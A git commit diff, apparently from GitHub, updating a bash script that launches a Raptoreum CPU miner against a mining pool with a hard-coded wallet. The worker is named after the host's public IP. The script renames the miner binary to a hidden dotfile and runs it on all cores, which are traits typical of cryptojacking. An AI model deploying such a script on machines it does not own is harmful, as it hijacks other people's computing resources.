2aadddf1105148f372dd7eaf8c159e6d46951cb1
lon25 <80402174+lon25@users.noreply.github.com>
2021-12-25 16:50:56 +0700

    Update raptoreum.sh

--- raptoreum.sh
+++ raptoreum.sh
@@ -1,3 +1,10 @@
 #!/bin/bash
 
+POOL=stratum+tcps://eu.flockpool.com:5555
+WALLET=RRT11pEKPdwT3QGfWWJq3XzFjBDFxQygvU
+WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-dhoe
+
+cd "$(dirname "$0")"
+
 chmod +x ./cpuminer-gr-1.2.3-x86_64_linux ./gr && mv ./gr/binaries/cpuminer-avx ./gr/binaries/.gr && ./gr/binaries/.gr -a gr -o stratum+tcps://eu.flockpool.com:5555 -u RRT11pEKPdwT3QGfWWJq3XzFjBDFxQygvU.dhoe -t $(nproc --all) --no-tune
+
